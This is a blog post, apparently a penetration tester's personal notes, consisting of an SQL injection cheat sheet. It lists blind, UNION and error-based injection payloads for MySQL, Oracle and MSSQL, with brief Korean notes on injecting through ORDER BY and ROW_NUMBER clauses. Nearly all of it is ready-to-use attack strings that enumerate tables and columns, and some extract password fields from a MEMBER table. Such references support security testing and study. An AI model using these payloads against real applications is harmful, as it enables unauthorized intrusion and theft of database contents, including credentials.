---
title: SQLi Cheat Sheet
categories: [Notes, Cheat Sheet]
tags: [Cheat Sheet, SQLi]
image:
  path: /assets/post/2025/Notes/Cheat Sheet/thumb.jpg
  alt: SQL Cheat Sheet Notes
published: true
---

## **1. Blind SQL Injection**

### **1-1. MySQL**

```
%' and database()='{DATABASE NAME}' and 1=1 #
%' and ascii(substr(database(),1,1))<128 and 1=1 # 
%' and LENGTH(database())<10 and 1=1 # 
%' and LENGTH((select table_name from information_schema.tables where table_schema = '{DATABASE_NAME}' limit 0,1))=1
%' and ascii(substr((select table_name from information_schema.tables where table_schema = '{DATABASE_NAME}' limit 0,1),1,1))<128
%' and length((select column_name from information_schema.columns WHERE table_name='{TABLE_NAME}' limit 0,1)) = 2
%' and ascii(substr((select column_name from information_schema.columns WHERE table_name='{TABLE_NAME}' limit 0,1),1,1))<128 #
%' and (select count('{TABLE_NAME}') from information_schema.columns WHERE table_name='{TABLE_NAME}')<10 and 1=1 # 
%' and ascii(substr((SELECT answer FROM answer LIMIT 0, 1),1,1))<128 #
```

---

### **1-2. Oracle**

```
# WHERE Clause Exploit Payloads
%' AND (SELECT COUNT(TABLE_NAME) FROM ALL_TABLES) < 128 --
%' AND ASCII(SUBSTR((SELECT TABLE_NAME FROM (SELECT TABLE_NAME, ROWNUM AS RNUM FROM USER_TABLES) WHERE RNUM=1), 1, 1)) < 128--
%' AND (SELECT COUNT(COLUMN_NAME) FROM ALL_TAB_COLUMNS WHERE TABLE_NAME='{TABLE_NAME}') = 10 --
%' AND ASCII(SUBSTR((SELECT COLUMN_NAME FROM (SELECT COLUMN_NAME, ROWNUM AS RNUM FROM ALL_TAB_COLUMNS WHERE TABLE_NAME='{TABLE_NAME}') WHERE RNUM=1), 1, 1)) < 128--
%' AND (SELECT COUNT('{COLUMN_NAME}') FROM '{TABLE_NAME}') < 100 --
%' AND ASCII(SUBSTR((SELECT '{COLUMN_NAME}' FROM (SELECT '{COLUMN_NAME}', ROWNUM AS RNUM FROM '{TABLE_NAME}') WHERE RNUM=1), 1, 1)) < 128--
%25' and user='SHOP' and '1%25'='1

# ORDER BY Clause Exploit Payloads
SELECT ID, FIRST_NAME FROM {TABLE_NAME} ORDER BY ID DESC,(SELECT CASE WHEN 1=2 THEN 1 ELSE (SELECT 1 FROM DUAL UNION SELECT 2 FROM DUAL) END FROM DUAL);
SELECT ID, FIRST_NAME FROM {TABLE_NAME} ORDER BY ID DESC,(SELECT CASE WHEN 1=2 THEN 1 ELSE 1/0 END FROM DUAL);
```

---

### **1-3. MSSQL**

```
%') and ASCII(SUBSTRING((SELECT column_name FROM INFORMATION_SCHEMA.columns WHERE table_name='{TABLE_NAME}'),1,1)) < 128 and 1=1 --
SELECT COUNT(column_name) FROM INFORMATION_SCHEMA.columns WHERE table_name='{TABLE_NAME}'
```

---

## **2\. UNION SQL Injection**

#### **2-1. MySQL**

```
%' UNION SELECT TALBE_NAME, 1, 1, 1 FROM INFORMATION_SCHEMA.tables WHERE TABLE_SCHEMA='{DATABASE_NAME}'
%' UNION SELECT TABLE_NAME, 1, 1, 1 FROM INFORMATION_SCHEMA.TABLES
%' UNION SELECT TABLE_CATALOG, TABLE_SCHEMA, TABLE_NAME, TABLE_TYPE FROM INFORMATION_SCHEMA.TABLES
%' UNION SELECT COLUMN_NAME, 1, 1, 1 FROM INFORMATION_SCHEMA.COLUMNS
```

---

### **2-2. Oracle**

```
%' UNION SELECT null, null, null, null FROM dual --
%' UNION SELECT null, TABLE_NAME from ALL_TABLES --
%' UNION SELECT null, {COLUMN_NAME} from all_tab_columns where table_name='{TABLE_NAME}' --
%' UNION SELECT null, {COLUMN_NAME}, null, null from {TABLE_NAME} --
%' UNION SELECT 1, user, null, null from dual where '1%25'='1
```

---

### **2-3. MSSQL**

```
-
```

---

## **3\. Error-based SQL Injection**

### **3-1. MySQL**

```
' AND extractvalue(rand(),concat(0x3a,database()))--
' AND extractvalue(rand(),concat(0x3a,(SELECT+concat(0x3a,TABLE_NAME)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA='{TABLE_SCHEMA}'+LIMIT+0,1)))--
' AND extractvalue(rand(),concat(0x3a,(SELECT+concat(0x3a,COLUMN_NAME)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_SCHEMA='{TABLE_SCHEMA}'+AND+TABLE_NAME='{TABLE_NAME}'+LIMIT+0,1)))--
' AND extractvalue(rand(),concat(0x3a,(SELECT+concat('{COLUMN_NAME}')+FROM+{TABLE_NAME}+LIMIT+0,1)))--
```

---

### **3-2. Oracle**

```
%' AND CTXSYS.DRITHSX.SN(user, SELECT COUNT(TABLE_NAME) FROM USER_TABLES))=1 --
%' AND CTXSYS.DRITHSX.SN(user, (SELECT TABLE_NAME FROM (SELECT TABLE_NAME, ROWNUM AS RNUM FROM USER_TABLES) WHERE RNUM=1))=1 --
%' AND CTXSYS.DRITHSX.SN(user, (SELECT COUNT(COLUMN_NAME) FROM ALL_TAB_COLUMNS WHERE TABLE_NAME='{TABLE_NAME}'))=1 --
%' AND CTXSYS.DRITHSX.SN(user, (SELECT COLUMN_NAME) FROM (SELECT COLUMN_NAME, ROWNUM AS RNUM FROM ALL_TAB_COLUMNS WHERE TABLE_NAME='{TABLE_NAME}') WHERE RNUM=3))=1 --
%' AND CTXSYS.DRITHSX.SN(user, (SELECT COUNT(PASS) FROM MEMBER))=1 --
%' AND  CTXSYS.DRITHSX.SN(user, (SELECT PASS FROM (SELECT PASS, ROWNUM AS RNUM FROM MEMBER) WHERE RNUM=1))= 1--

491%25' and ctxsys.drithsx.sn(user,(select 'jang : ['||user||'] : han' from dual))=1 and '1%25'='1
```

---

### **3-3. MSSQL**

```
-
```

---

## **4\. Others**

### **4-1. ROW\_NUMBER() \[MySQL / Oracle / MSSQL\]**

```
SELECT ROW_NUMBER() OVER(
	PARTITION BY T1.JOB
    	ORDER BY T1.JOB, T1.ENAME, [ATTACK_SURFACE_TABLE]
    ) AS ROW_NUM, T1.*
FROM EMP T1
ORDER BY T1.JOB, T1.ENAME;
```

- 위 SQL 쿼리문에서 "ATTACK_SURFACE_TABLE" 컬럼이 사용자에게 입력받은 파라미터라면 인젝션 가능 여부 테스트 필요


- 아래와 같은 공격 구문에서 (TABLE_001, TABLE_002, etc.) 컬럼명을 user, SYS_DATABASE_NAME 등으로 변조하여 데이터 확인 가능

```
ATTACK_SURFACE_TABLE ASC) AS ROW_NUM, TABLE_001, TABLE_002, TABLE_003%20--
```

---

### **4-2. 데이터베이스 버전(Version) 확인**

```
SELECT version FROM PRODUCT_COMPONENT_VERSION WHERE product LIKE 'Oracle Database%';
SELECT version FROM PRODUCT_COMPONENT_VERSION WHERE rownum=1;
```

---

## **5\. Reference**

> 1. https://pentestmonkey.net/cheat-sheet/sql-injection/informix-sql-injection-cheat-sheet
> 2. https://sqltest.net/

---

<h2 style="text-align: center;" data-ke-size="size26"><b>END</b></h2>